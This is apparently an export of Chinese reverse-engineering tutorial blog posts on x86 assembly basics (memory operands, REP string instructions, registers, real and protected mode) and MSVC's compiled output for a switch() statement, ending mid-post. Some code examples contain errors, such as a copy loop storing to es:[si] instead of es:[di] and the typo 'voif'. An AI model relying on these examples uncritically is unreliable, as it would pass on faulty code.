    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%89%EF%BC%89.html</url>
    <content><![CDATA[<p>[TOC]</p>
<p>参考文档：《简明 x86 汇编语言教程》作者：司徒彦南<br>##操作内存<br>我们可以将内存想象为一个顺序的字节流。操作内存是，首先需要的就是他的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,[0]</span><br></pre></td></tr></table></figure>
<p><code>方括号</code>表示，里面的表达式指定的不是<code>立即数</code>，而是<code>偏移量</code>。在是模式中，<code>DS:0</code>中的那个<code>字</code>会被装入AX。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [0],ax</span><br></pre></td></tr></table></figure>
<p>mov指令也可以把数据保存到内存中。<br>###描述内存宽度的操作符</p>
<table>
<thead>
<tr>
<th align="left">操作符</th>
<th align="left">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">byte ptr</td>
<td align="left">一个字节（8-bit，1 byte）</td>
</tr>
<tr>
<td align="left">word ptr</td>
<td align="left">一个字（16-bit）</td>
</tr>
<tr>
<td align="left">dword ptr</td>
<td align="left">一个双字（32-bit）</td>
</tr>
</tbody></table>
<p>例如，在DS:100h处保存1234h，以字存放：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov word ptr [100h],01234h</span><br></pre></td></tr></table></figure>
<p>于是，我们将mov指令扩展为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov reg(8,16,32),mem(8,16,32)</span><br><span class="line">mov mem(8,16,32),reg(8,16,32)</span><br><span class="line">mov mem(8,16,32),imm(8,16,32)</span><br></pre></td></tr></table></figure>
<p>需要说明的是，加减同样也可以在<code>[]</code>(取地址操作)中使用，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,[bx+10]</span><br><span class="line">mov ax,[bx+si]</span><br><span class="line">mov ax,es:[di+bp]</span><br></pre></td></tr></table></figure>

<p>###串操作<br>前面说到，内存可以和寄存器交换数据，也可以被赋予立即数。问题是，如果我们需要把内存的某部分内容复制到另一个地址，要怎么操作呢？<br>设想将DS:SI处的连续512字节内容复制到ES:DI（不考虑可能的重叠）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">			mov cx,512			;循环次数</span><br><span class="line">NextByte:	mov al,ds:[si]</span><br><span class="line">			mov es:[si],al</span><br><span class="line">			inc si</span><br><span class="line">			inc di</span><br><span class="line">			loop NextByte</span><br></pre></td></tr></table></figure>
<p>这是一种不太完美的解决方法，因为效率不好。<br>Intel的CPU的强项是<code>串操作</code>。所谓串操作就是由CPU去完成<code>某一数量的重复的内存操作</code>。需要说明的是，我们常用的<code>KMP算法</code>（用于匹配字符串的模式）的改进——Boyer算法，由于没有利用到串操作，因此在Intel的CPU上的效率并非最优。好的编译器往往可以利用Intel CPU的这一特性优化代码，然而，并非所有的时候他都能产生最好的代码。</p>
<p>某些指令可以加上<code>REP</code>前缀，这些指令通常被叫做<code>串操作指令</code>。<br>举例来说，<code>STOSD</code>指令将EAX的内容保存到ES:DI，同时在DI上加&#x2F;减<code>4</code>；<code>STOSB</code>和<code>STOSW</code>分别作<code>1字节</code>或<code>1字</code>的操作，在DI上加&#x2F;减的数是<code>1</code>或<code>2</code>。<br>在DI上是加还是减，取决于<code>DF</code>标志，如果DF被<code>复位</code>，则加；反之则减。</p>
<p><code>置位</code>、<code>复位</code>的指令分别是<code>STD</code>、<code>CLD</code>。</p>
<p>除了REP，常用的前缀还包括<code>REPNE</code>、<code>REPZ</code>、<code>REPE</code>、<code>REPNZ</code>等。</p>
<table>
<thead>
<tr>
<th align="left">操作码</th>
<th align="left">指令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">F3 6C</td>
<td align="left">REP INS r&#x2F;m8,DX</td>
<td align="left">将 (E)CX个字节从端口输入到ES:[(E)DI]</td>
</tr>
<tr>
<td align="left">F3 6D</td>
<td align="left">REP INS r&#x2F;m16,DX</td>
<td align="left">将 (E)CX 个字从端口 DX 输入到 ES:[(E)DI]</td>
</tr>
<tr>
<td align="left">F3 6D</td>
<td align="left">REP INS r&#x2F;m32,DX</td>
<td align="left">将 (E)CX 个双字从端口 DX 输入到 ES:[(E)DI]</td>
</tr>
<tr>
<td align="left">F3 A4</td>
<td align="left">REP MOVS m8,m8</td>
<td align="left">将 (E)CX 个字节从 DS:[(E)SI] 移到 ES:[(E)DI]</td>
</tr>
<tr>
<td align="left">F3 A5</td>
<td align="left">REP MOVS m16,m16</td>
<td align="left">将 (E)CX 个字从 DS:[(E)SI] 移到 ES:[(E)DI]</td>
</tr>
<tr>
<td align="left">F3 A5</td>
<td align="left">REP MOVS m32,m32</td>
<td align="left">将 (E)CX 个双字从 DS:[(E)SI] 移到 ES:[(E)DI]</td>
</tr>
<tr>
<td align="left">F3 6E</td>
<td align="left">REP OUTS DX,r&#x2F;m8</td>
<td align="left">将 (E)CX 个字节从 DS:[(E)SI] 输出到端口 DX</td>
</tr>
<tr>
<td align="left">F3 6F</td>
<td align="left">REP OUTS DX,r&#x2F;m16</td>
<td align="left">将 (E)CX 个字从 DS:[(E)SI] 输出到端口 DX</td>
</tr>
<tr>
<td align="left">F3 6F</td>
<td align="left">REP OUTS DX,r&#x2F;m32</td>
<td align="left">将 (E)CX 个双字从 DS:[(E)SI] 输出到端口 DX</td>
</tr>
<tr>
<td align="left">F3 AC</td>
<td align="left">REP LODS AL</td>
<td align="left">将 (E)CX 个字节从 DS:[(E)SI] 加载到 AL</td>
</tr>
<tr>
<td align="left">F3 AD</td>
<td align="left">REP LODS AX</td>
<td align="left">将 (E)CX 个字从 DS:[(E)SI] 加载到 AX</td>
</tr>
<tr>
<td align="left">F3 AD</td>
<td align="left">REP LODS EAX</td>
<td align="left">将 (E)CX 个双字从 DS:[(E)SI] 加载到 EAX</td>
</tr>
<tr>
<td align="left">F3 AA</td>
<td align="left">REP STOS m8</td>
<td align="left">使用 AL 填写位于 ES:[(E)DI] 的 (E)CX 个字节</td>
</tr>
<tr>
<td align="left">F3 AB</td>
<td align="left">REP STOS m16</td>
<td align="left">使用 AX 填写位于 ES:[(E)DI] 的 (E)CX 个字</td>
</tr>
<tr>
<td align="left">F3 AB</td>
<td align="left">REP STOS m32</td>
<td align="left">使用 EAX 填写位于 ES:[(E)DI] 的 (E)CX 个双字</td>
</tr>
<tr>
<td align="left">F3 A6</td>
<td align="left">REPE CMPS m8,m8</td>
<td align="left">在 ES:[(E)DI] 与 DS:[(E)SI] 中查找不匹配的字节</td>
</tr>
<tr>
<td align="left">F3 A7</td>
<td align="left">REPE CMPS m16,m16</td>
<td align="left">在 ES:[(E)DI] 与 DS:[(E)SI] 中查找不匹配的字</td>
</tr>
<tr>
<td align="left">F3 A7</td>
<td align="left">REPE CMPS m32,m32</td>
<td align="left">在 ES:[(E)DI] 与 DS:[(E)SI] 中查找不匹配的双字</td>
</tr>
<tr>
<td align="left">F3 AE</td>
<td align="left">REPE SCAS m8</td>
<td align="left">从 ES:[(E)DI] 开始查找非 AL 字节</td>
</tr>
<tr>
<td align="left">F3 AF</td>
<td align="left">REPE SCAS m16</td>
<td align="left">从 ES:[(E)DI] 开始查找非 AX 字</td>
</tr>
<tr>
<td align="left">F3 AF</td>
<td align="left">REPE SCAS m32</td>
<td align="left">从 ES:[(E)DI] 开始查找非 EAX 双字</td>
</tr>
<tr>
<td align="left">F2 A6</td>
<td align="left">REPNE CMPS m8,m8</td>
<td align="left">在 ES:[(E)DI] 与 DS:[(E)SI] 中查找匹配字节</td>
</tr>
<tr>
<td align="left">F2 A7</td>
<td align="left">REPNE CMPS m16,m16</td>
<td align="left">在 ES:[(E)DI] 与 DS:[(E)SI] 中查找匹配字</td>
</tr>
<tr>
<td align="left">F2 A7</td>
<td align="left">REPNE CMPS m32,m32</td>
<td align="left">在 ES:[(E)DI] 与 DS:[(E)SI] 中查找匹配双字</td>
</tr>
<tr>
<td align="left">F2 AE</td>
<td align="left">REPNE SCAS m8</td>
<td align="left">从 ES:[(E)DI] 开始查找 AL</td>
</tr>
<tr>
<td align="left">F2 AF</td>
<td align="left">REPNE SCAS m16</td>
<td align="left">从 ES:[(E)DI] 开始查找 AX</td>
</tr>
<tr>
<td align="left">F2 AF</td>
<td align="left">REPNE SCAS m32</td>
<td align="left">从 ES:[(E)DI] 开始查找 EAX</td>
</tr>
</tbody></table>
<p>####说明：<br>按计数寄存器 ((E)CX) 中指定的次数重复执行字符串指令，或是重复到 ZF 标志不再满足指定的条件。REP（重复）、REPE（相等时重复）、REPNE（不相等时重复）、REPZ（为零时重复）及 REPNZ（不为零时重复）助记符都是可以添加到一些字符串指令中的前缀。REP 前缀可以添加到 INS、OUTS、MOVS、LODS 及 STOS 指令，REPE、REPNE、REPZ 及 REPNZ 前缀可以添加到 CMPS 与 SCAS 指令。（REPZ 与 REPNZ 前缀分别是 REPE 与 REPNE 前缀的同义形式）。同非字符串指令一起使用时，REP 前缀的行为未定义。</p>
<p>REP 前缀一次只能应用于一条字符串指令。要重复指令块，请使用 LOOP 指令或其它循环结构。</p>
<p>所有这些重复前缀都会使关联的指令重复执行，直到寄存器 (E)CX 中的计数递减到 0（请参阅下表）。（如果当前地址大小属性为 32，则将寄存器 ECX 用作计数器；如果大小属性为 16，则将 CX 寄存器用作计数器）。在每次迭代之后，REPE、REPNE、REPZ 及 REPNZ 前缀还会检查 ZF 标志的状态，如果 ZF 标志未处于指定的状态，则终止重复循环。同时测试两个终止条件时，终止重复的原因可以通过使用 JECXZ 指令来测试 (E)CX 寄存器进行确定，也可以通过使用 JZ、JNZ 及 JNE 指令来测试 ZF 标志进行确定。</p>
<table>
<thead>
<tr>
<th align="left">重复前缀</th>
<th align="left">终止条件1</th>
<th align="left">终止条件2</th>
</tr>
</thead>
<tbody><tr>
<td align="left">REP</td>
<td align="left">ECX&#x3D;0</td>
<td align="left">无</td>
</tr>
<tr>
<td align="left">REPE&#x2F;REPZ</td>
<td align="left">ECX&#x3D;0</td>
<td align="left">ZF&#x3D;0</td>
</tr>
<tr>
<td align="left">REPNE&#x2F;REPNZ</td>
<td align="left">ECX&#x3D;0</td>
<td align="left">ZF&#x3D;1</td>
</tr>
<tr>
<td align="left"><strong>使用 REPE&#x2F;REPZ 与 REPNE&#x2F;REPNZ 前缀时，由于 CMPS 与 SCAS 指令都会根据它们的比较结果设置 ZF 标志，因此 ZF 标志不需要初始化。</strong></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p>所以，我们可以把上面的程序改写为如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cld			;复位DF</span><br><span class="line">mov cx,128		;512/4=128，共128个双字</span><br><span class="line">rep movsd</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——汇编基础（二）</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BA%8C%EF%BC%89.html</url>
    <content><![CDATA[<p>[TOC]</p>
<p>参考文档：《简明 x86 汇编语言教程》作者：司徒彦南<br>##使用寄存器<br>对x86基本寄存器的认识，对于一个汇编语言编程人员来说是不可或缺的。</p>
<p>###汇编语言中的整数常量表示<br>####十进制整数<br>这是<code>汇编器</code>默认的数制。直接用我们熟悉的表示方式表示即可。例如，1234表示十进制的1234。不过，如果你指定了使用其他数制，或者有凡事都进行完整定义的习惯，也可以写成<code>[十进制数]d</code>或<code>[十进制数]D</code>在行式。<br>####十六进制数<br>这是<code>汇编程序</code>中最常用的数制。十六进制数表示为<code>0[十六进制数]h</code>或<code>0[十六进制数]H</code>，其中，如果十六进制数的第一位是数字，则开头的0可以省略，例如<code>7fffh</code>，<code>0ffffh</code>。<br>####二进制数<br>这也是一种常用的数制。二进制表示为<code>[二进制数]b</code>或<code>[二进制数]B</code>。一般程序中用二进制数表示掩码等数据非常的直观，但需要些很长的数据（4位二进制数相当于一位十六进制数）。例如，1010110b。<br>####八进制数<br>八进制数现在已经不是很常用了，一个典型的例子是Unix的文件属性。八进制数的形式是<code>[八进制数]q</code>、<code>[八进制数]Q</code>、<code>[八进制数]o</code>、<code>[八进制数]O</code>。例如，777Q。<br><strong>调试器默认使用十六进制表示整数</strong></p>
<p>###简单指令<br>下面介绍一些指令，在这之前，我们约定：</p>
<ol>
<li>reg32，32-bit寄存器，如EAX、EBX等。</li>
<li>reg16，16-bit寄存器，如AX，BX等。</li>
<li>reg8？，8-bit寄存器，如AL，BH等。</li>
<li>imm32，32-bit立即数，可以理解为常数。</li>
<li>imm16，16-bit立即数。</li>
<li>imm8？ 8-bit立即数。</li>
</ol>
<p>####MOV指令<br><code>mov</code>，要move的缩写，它可以将数据<code>发送到</code>寄存器中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov reg32,(reg32 | imm8 | imm16 | imm32)</span><br><span class="line">mov reg16,(reg16 | imm8 | imm16)</span><br><span class="line">mov reg8,(reg8 | imm8)</span><br><span class="line">	</span><br><span class="line">	例如：</span><br><span class="line">mov eax,ebx			;ebx内容送入eax</span><br><span class="line">mov ecx,ebx			;edx内容送入ecx</span><br></pre></td></tr></table></figure>
<p><code>mov eax,010h</code>表示在EAX寄存器中载入<code>00000010h</code>。</p>
<p>####xchg指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xchg reg32,reg32</span><br><span class="line">xchg reg16,reg16</span><br><span class="line">xchg reg8,reg8</span><br><span class="line">	</span><br><span class="line">	例如：</span><br><span class="line">	xchg ebx,ecx，表示ebx与ecx的数值被交换。</span><br></pre></td></tr></table></figure>

<p>####递增（减）指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inc reg(8,16,32)</span><br><span class="line">dec reg(8,16,32)</span><br></pre></td></tr></table></figure>

<p>####add指令<br>将寄存器的数值与另一寄存器或立即数的值相加，并<code>存回此寄存器</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add reg32,reg32/imm(8,16,32)</span><br><span class="line">add reg16,reg16/imm(8,16)</span><br><span class="line">add reg8,reg8/imm(8)</span><br><span class="line">	</span><br><span class="line">	减法SUB同ADD</span><br></pre></td></tr></table></figure>

<p>####lea指令<br>目标地址传送指令：将一个近地址<code>指针</code>写入到指定的寄存器。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea reg16,mem16</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">lea ax,buf			;将存储器buf所指的地址传送给ax</span><br></pre></td></tr></table></figure>
<p>其中，reg16必须是一个16位的通用寄存器，mem16必须是一个存储器。执行完这个指令后，就讲mem16所指的16位<code>偏移地址</code>传送到了reg16中。<br><strong>MOV指令传送的是地址所指的<code>内容</code>，而LEA只是<code>传地址</code></strong></p>
<p>####rep、stos指令<br>REP指令的作用是重复上面的指令，ECX的值是重复次数。<br>STOS指令是将EAX中的值拷贝到一个目的地址中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea edi,[ebp-0C0h]</span><br><span class="line">mov ecx,30h</span><br><span class="line">mov eax,0CCCCCCCCh</span><br><span class="line">rep stos dword ptr es:[edi]</span><br></pre></td></tr></table></figure>
<ol>
<li>REP指令可以是任何字符串指令（CMPS、LODS、MOVS、SCAS、STOS）的前缀。<br>  REP能够引发其后的字符串指令被重复，只要ECX的值不为0，重复就会继续。每一次字符串指令执行后，ECX的值都会减小。</li>
<li>STOS(store into string)意思是把EAX的内容拷贝到一个目的地址。<br>  用法：<code>stos dst</code>，dst是一个目的地址，例如<code>stos dword ptr es:[edi]</code>。<code>dword ptr</code>（强制转换成dword格式）前缀是告诉stos，一次拷贝双字（4个字节）到目的地址。</li>
</ol>
<p>####逻辑运算<br>逻辑运算指令qnrt包括AND, OR, XOR, TEST, NOT，逻辑运算的结果会影响到CF, PF, AF, ZF, OF标志位。<br>关于如何影响及哪些操作影响哪些标志位，请参考[Win32 汇编 - 逻辑运算指令: AND、OR、XOR、NOT、TEST][1]<br>[1]: <a href="http://blog.csdn.net/betabin/article/details/7306347">http://blog.csdn.net/betabin/article/details/7306347</a> “Win32 汇编 - 逻辑运算指令: AND、OR、XOR、NOT、TEST”</p>
<p>####cmp指令<br>cmp（compare）指令比较两个操作数的大小，进行的运算是<code>第一个操作数减去第二个操作数</code>，但结果不会影响两个操作数的值，只会影响flag的CF、ZF、OF、AF、PF。<br>对各个flag的影响如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">若执行指令后</span><br><span class="line">ZF=1 这个简单，则说明两个数相等，因为zero为1说明结果为0</span><br><span class="line">当无符号时：</span><br><span class="line">若</span><br><span class="line">CF=1 则说明了有进位或借位，cmp是进行的减操作，故可以看出为借位，所以，此时oprd1&lt;oprd2</span><br><span class="line">CF=0 则说明了无借位，但此时要注意ZF是否为0，若为0，则说明结果不为0，故此时oprd1&gt;oprd2</span><br><span class="line">当有符号时：</span><br><span class="line">若SF=0，OF=0 则说明了此时的值为正数，没有溢出，可以直观的看出，oprd1&gt;oprd2</span><br><span class="line">若SF=1，OF=0 则说明了此时的值为负数，没有溢出，则为oprd1&lt;oprd2</span><br><span class="line">若SF=0，OF=1 则说明了此时的值为正数，有溢出，可以看出oprd1&lt;oprd2</span><br><span class="line">若SF=1，OF=1则说明了此时的值为负数，有溢出，可以看出oprd1&gt;oprd2</span><br><span class="line">最后两个可以作出这种判断的原因是，溢出的本质问题：</span><br><span class="line">两数同为正，相加，值为负，则说明溢出</span><br><span class="line">两数同为负，相加，值为正，则说明溢出</span><br><span class="line">故有，正正得负则溢出，负负得正则溢出</span><br></pre></td></tr></table></figure>
<p>参考来自：[[汇编cmp比较指令详解]][1]<br>[1]: <a href="http://laokaddk.blog.51cto.com/368606/284280/">http://laokaddk.blog.51cto.com/368606/284280/</a> “汇编cmp比较指令详解”<br>####跳转指令<br>跳转指令分三类：</p>
<ol>
<li>无条件跳转：JMP</li>
<li>根据CX、ECX寄存器的值跳转：JCXZ（CX为0则跳转）、JECXZ（ECX为0则跳转）</li>
<li>根据EFLAGS寄存器的标志位跳转，列表如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JE   ;等于则跳转</span><br><span class="line">JNE  ;不等于则跳转</span><br><span class="line"></span><br><span class="line">JZ   ;为 0 则跳转</span><br><span class="line">JNZ  ;不为 0 则跳转</span><br><span class="line"></span><br><span class="line">JS   ;为负则跳转</span><br><span class="line">JNS  ;不为负则跳转</span><br><span class="line"></span><br><span class="line">JC   ;进位则跳转</span><br><span class="line">JNC  ;不进位则跳转</span><br><span class="line"></span><br><span class="line">JO   ;溢出则跳转</span><br><span class="line">JNO  ;不溢出则跳转</span><br><span class="line"></span><br><span class="line">JA   ;无符号大于则跳转</span><br><span class="line">JNA  ;无符号不大于则跳转</span><br><span class="line">JAE  ;无符号大于等于则跳转</span><br><span class="line">JNAE ;无符号不大于等于则跳转</span><br><span class="line"></span><br><span class="line">JG   ;有符号大于则跳转</span><br><span class="line">JNG  ;有符号不大于则跳转</span><br><span class="line">JGE  ;有符号大于等于则跳转</span><br><span class="line">JNGE ;有符号不大于等于则跳转</span><br><span class="line"></span><br><span class="line">JB   ;无符号小于则跳转</span><br><span class="line">JNB  ;无符号不小于则跳转</span><br><span class="line">JBE  ;无符号小于等于则跳转</span><br><span class="line">JNBE ;无符号不小于等于则跳转</span><br><span class="line"></span><br><span class="line">JL   ;有符号小于则跳转</span><br><span class="line">JNL  ;有符号不小于则跳转</span><br><span class="line">JLE  ;有符号小于等于则跳转</span><br><span class="line">JNLE ;有符号不小于等于则跳转</span><br><span class="line"></span><br><span class="line">JP   ;奇偶位置位则跳转</span><br><span class="line">JNP  ;奇偶位清除则跳转</span><br><span class="line">JPE  ;奇偶位相等则跳转</span><br><span class="line">JPO  ;奇偶位不等则跳转</span><br></pre></td></tr></table></figure></li>
</ol>
<p>###实模式与保护模式<br>为何要了解Intel 80386的保护模式和分段机制？首先，我们知道Intel 80386只有在进入保护模式后，才能充分发挥其强大的功能，提供更好的保护机制和更大的寻址空间，否则仅仅是一个快速的8086而已。没有一定的保护机 制，任何一个应用软件都可以任意访问所有的计算机资源，这样也就无从谈起操作系统设计了。且Intel 80386的分段机制一直存在，无法屏蔽或避免。其次，在我们的bootloader设计中，涉及到了从实模式到保护模式的处理，我们的操作系统功能（比 如分页机制）是建立在Intel 80386的保护模式上来设计的。如果我们不了解保护模式和分段机制，则我们面向Intel 80386体系结构的操作系统设计实际上是建立在一个空中楼阁之上。<br>####模式种类<br>从80386开始，cpu有三种工作方式：实模式，保护模式和虚拟8086模式。只有在刚刚启动的时候是real-mode，等到linux操作系统运行起来以后就运行在保护模式。<br>实模式只能访问地址在1M以下的内存称为常规内存，我们把地址在1M 以上的内存称为扩展内存。<br>在保护模式下，全部32条地址线有效，可寻址高达4G字节的物理地址空间;扩充的存储器分段管理机制和可选的存储器分页管理机制，不仅为存储器共享和保护提供了硬件支持，而且为实现虚拟存储器提供了硬件支持;支持多任务，能够快速地进行任务切换和保护任务环境;4个特权级和完善的特权检查机制，既能实现资源共享又能保证代码和数据的安全和保密及任务的隔离;支持虚拟8086方式，便于执行8086程序。<br>虚拟8086模式是运行在保护模式中的实模式，为了在32位保护模式下执行纯16位程序。它不是一个真正的CPU模式，还属于保护模式。<br>####模式区别<br>保护模式同实模式的根本区别是进程内存受保护与否 。可寻址空间的区别只是这一原因的果。<br><strong>【实模式】</strong>将整个物理内存看成分段的区域,程序代码和数据位于不同区域，系统程序和用户程序没有区别对待，而且每一个指针都是指向”实在”的物理地址。这样一来，用户程序的一个指针如果指向了系统程序区域或其他用户程序区域，并改变了值，那么对于这个被修改的系统程序或用户程序，其后果就很可能是灾难性的。为了克服这种低劣的内存管理方式，处理器厂商开发出保护模式。<br><strong>【保护模式】</strong>物理内存地址不能直接被程序访问，程序内部的地址（虚拟地址）要由操作系统转化为物理地址去访问，程序对此一无所知。 至此，进程（这时我们可以称程序为进程了）有了严格的边界，任何其他进程根本没有办法访问不属于自己的物理内存区域，甚至在自己的虚拟地址范围内也不是可以任意访问的，因为有一些虚拟区域已经被放进一些公共系统运行库。这些区域也不能随便修改，若修改就会有: SIGSEGV（linux 段错误）;非法内存访问对话框（windows 对话框）。<br><strong>【补充】</strong>保护模式下，有两个段表：GDT（Global Descriptor Table）和LDT（Local Descriptor Table），每一张段表可以包含8192 (2^13)个描述符[1]，因而最多可以同时存在2 * 2^13 &#x3D; 2^14个段。虽然保护模式下可以有这么多段，逻辑地址空间看起来很大，但实际上段并不能扩展物理地址空间，很大程度上各个段的地址空间是相互重叠的。目 前所谓的64TB（2^(14+32)&#x3D;2^46）逻辑地址空间是一个理论值，没有实际意义。在32位保护模式下，真正的物理空间仍然只有2^32字节那 么大。注：在ucore lab中只用到了GDT，没有用LDT。<br>####64位奔腾4处理器工作模式<br>事实上，现在的64位奔腾4处理器，拥有三种基本模式和一种扩展模式，</p>
<ol>
<li>基本模式：<br> <strong>保护模式：纯32位保护执行环境。</strong><br> <strong>实模式：纯16位无保护执行环境。</strong><br> <strong>系统管理模式：当SMI引脚为有效进入系统管理模式，首先保存当前的CPU上下文。它有独立的地址空间，用来执行电源管理或系统安全方面的指令。</strong></li>
<li>扩展模式：<br> <strong>IA-32e模式，64位操作系统运行在该模式。</strong><br> 该模式有两种子模式:<br> 1）<strong>兼容模式</strong>：该模式下，64位操作系统运行在32位兼容环境，能正常运行16，32位应用程序就像基本的保护模式一样，访问32位地址空间，但不能运行纯16位实模式程序（就是不能运行虚拟86模式程序了）。<br> 2）<strong>64位模式</strong>：在该模式下，处理器完全执行64位指令，使用64位地址空间和64操作数，运行16，32位程序必须切换到兼容模式。<br> IA-32e子模式的切换完全基于代码段寄存器。这样一来，运行在IA-32e模式中（64位）的OS完全可以无缝的运行所有16，32，64为应用程序，通过设置32位后的CS。</li>
</ol>
<p>##练习<br>把寄存器全部设置成0的状态，然后执行下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax,0a1234h			;将十六进制数0a1234h送入eax</span><br><span class="line">mov bx,ax			;将ax内容送入bx</span><br><span class="line">mov ah,bl			;将bl内容送入ah</span><br><span class="line">mov al,bh			;将bh内容送入al</span><br></pre></td></tr></table></figure>
<p>思考此时EAX的内容是多少?</p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程——switch()</title>
    <url>/re/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E2%80%94%E2%80%94switch().html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="case陈述式较少的情况"><a href="#case陈述式较少的情况" class="headerlink" title="case陈述式较少的情况"></a>case陈述式较少的情况</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">voif <span class="title">f</span><span class="params">( <span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (a)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">printf</span>(<span class="string">&quot;zero\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">&quot;one\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">&quot;two\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>: <span class="built_in">printf</span>(<span class="string">&quot;sth unknown\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">f</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><h4 id="未优化的MSVC"><a href="#未优化的MSVC" class="headerlink" title="未优化的MSVC"></a>未优化的MSVC</h4><p>指令清单如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tv64 = -4			; size = 4</span><br><span class="line">_a$ = 8 			; size = 4</span><br><span class="line">_f		PROC</span><br><span class="line">	push ebp</span><br><span class="line">	mov ebp,esp</span><br><span class="line">	push ecx</span><br><span class="line">	mov eax, DWORD PTR _a$[ebp]</span><br><span class="line">	mov DWORD PTR tv64[ebp], eax</span><br><span class="line">	cmp DWORD PTR tv64[ebp], 0</span><br><span class="line">	je SHORT $LN4@f</span><br><span class="line">	cmp DWORD PTR tv64[ebp], 1</span><br><span class="line">	je SHORT $LN3@f</span><br><span class="line">	cmp DWORD PTR tv64[ebp], 2</span><br><span class="line">	je SHORT $LN2@f</span><br><span class="line">	jmp SHORT $LN1@f</span><br><span class="line">$LN4@f:</span><br><span class="line">	push OFFSET $SG739 ; &#x27;zero&#x27;, 0aH, 00H</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">	jmp SHORT $LN7@f</span><br><span class="line">$LN3@f:</span><br><span class="line">	push OFFSET $SG741 ; &#x27;one&#x27;, 0aH, 00H</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">	jmp SHORT $LN7@f</span><br><span class="line">$LN2@f:</span><br><span class="line">	push OFFSET $SG743 ; &#x27;two&#x27;, 0aH, 00H</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">	jmp SHORT $LN7@f</span><br><span class="line">$LN1@f:</span><br><span class="line">	push OFFSET $SG745 ; &#x27;sth unknown&#x27;, 0aH, 00H</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line">	jmp SHORT $LN7@f</span><br><span class="line">$LN7@f:</span><br><span class="line">	mov esp, ebp</span><br><span class="line">	pop ebp</span><br><span class="line">	ret 0</span><br><span class="line">_f		ENDP</span><br></pre></td></tr></table></figure>

<p>上面这个函数的源程序相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void f (int a)</span><br><span class="line">&#123;</span><br><span class="line">	if (a==0)</span><br><span class="line">		printf (&quot;zero\n&quot;); </span><br><span class="line">	else if (a==1)</span><br><span class="line">		printf (&quot;one\n&quot;); </span><br><span class="line">	else if (a==2)</span><br><span class="line">		printf (&quot;two\n&quot;);</span><br><span class="line">elseprintf (&quot;sth unknown\n&quot;); &#125;;</span><br></pre></td></tr></table></figure>
<p>如果仅从汇编代码入手，那么我们无法判断上述函数是一个判断表达式较少的switch()语句、还是一组 if()语句。确实可以认为，switch()语句是一种旨在简化大量嵌套if()语句而设计的语法糖。<br>若用GCC 4.4.1编译器编译这个程序，无论是否启用其最大程度优化的选项<code>-O3</code>，生成的汇编代码也和 MSVC 编译出来的代码没有什么区别。</p>
<h4 id="优化的MSVC"><a href="#优化的MSVC" class="headerlink" title="优化的MSVC"></a>优化的MSVC</h4><p>若经指令<code>cl 1.c /Fa1.asm /Ox</code>编译上述程序，可得到如下指令清单：</p>
